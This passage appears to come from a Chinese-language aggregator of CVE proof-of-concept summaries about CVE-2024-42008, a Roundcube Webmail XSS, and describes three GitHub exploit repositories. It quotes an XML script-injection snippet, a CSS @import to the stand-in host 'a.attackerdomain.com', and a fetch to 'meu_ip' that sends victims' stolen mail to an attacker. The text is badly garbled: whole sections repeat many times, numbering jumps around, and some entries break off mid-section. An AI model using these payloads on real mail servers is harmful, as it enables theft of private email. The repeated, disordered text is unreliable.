3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

## CVE-2024-42008 Roundcube XSS漏洞

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本（XSS）

**影响应用:** Roundcube

**危害等级:** 高危，可能导致信息泄露、账户劫持和恶意邮件发送

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 受害者需要打开包含恶意附件的邮件或访问包含恶意脚本的页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008是Roundcube Webmail中rcmail_action_mail_get->run()函数存在的一个跨站脚本漏洞。攻击者可以通过发送包含特制HTML内容的邮件来利用此漏洞。具体来说，攻击者可以利用CSS动画和JavaScript事件处理程序（如onanimationstart）来绕过内容过滤，从而在受害者的浏览器中执行任意JavaScript代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且影响了Roundcube的多个版本。POC代码的提供进一步证明了其有效性。POC通过构造包含恶意CSS动画属性和JavaScript代码的HTML邮件，当用户查看邮件时，JavaScript代码会在用户浏览器中执行，从而窃取用户邮箱中的邮件内容和元数据，并将其发送到攻击者的服务器。

**投毒风险：**
虽然POC的主要目的是演示漏洞利用，但仍然存在一定的投毒风险。例如：

1.  `ATTACKER_IP` 和 `ATTACKER_PORT`: 攻击者可能会诱导用户修改脚本中的 `ATTACKER_IP` 和 `ATTACKER_PORT` 设置，指向一个由攻击者控制的恶意服务器，以便收集用户邮箱信息。
2.  Payload修改: 攻击者可能尝试修改XSS payload，在窃取邮件的同时，尝试执行其他恶意操作，例如植入恶意cookie、重定向用户到钓鱼网站等。
3.  README.md 中的潜在风险： 虽然`README.md` 文件本身不太可能包含恶意代码，但如果攻击者诱导用户下载并执行其他恶意文件（例如，伪装成依赖项的脚本），则可能存在风险。

综合考虑，POC代码本身包含的投毒风险较低，约为10%。主要风险在于攻击者可能利用POC进行二次修改和包装，从而实现更隐蔽和具有破坏性的攻击。

**利用方式：**

1.  **构造恶意邮件：** 攻击者创建一个包含恶意HTML内容的邮件。这个HTML内容包含一个CSS动画，当动画开始时，会触发JavaScript代码的执行。
2.  **发送恶意邮件：** 攻击者将恶意邮件发送给Roundcube用户。
3.  **用户查看邮件：** 当用户打开或查看包含恶意HTML内容的邮件时，浏览器会解析并执行其中的HTML和JavaScript代码。
4.  **XSS触发：** CSS动画的`onanimationstart`事件被触发，执行预先设定的JavaScript代码。
5.  **数据窃取：** JavaScript代码窃取用户的邮件内容（包括UID、消息列表、邮件源码和附件等）和元数据。
6.  **数据外发：** 窃取的数据通过HTTP请求发送到攻击者控制的服务器。
7.  **攻击者服务器接收数据：** 攻击者的服务器接收并记录窃取到的数据。

**项目地址:** [rpgsec/Roundcube-CVE-2024-42008-POC](https://github.com/rpgsec/Roundcube-CVE-2024-42008-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

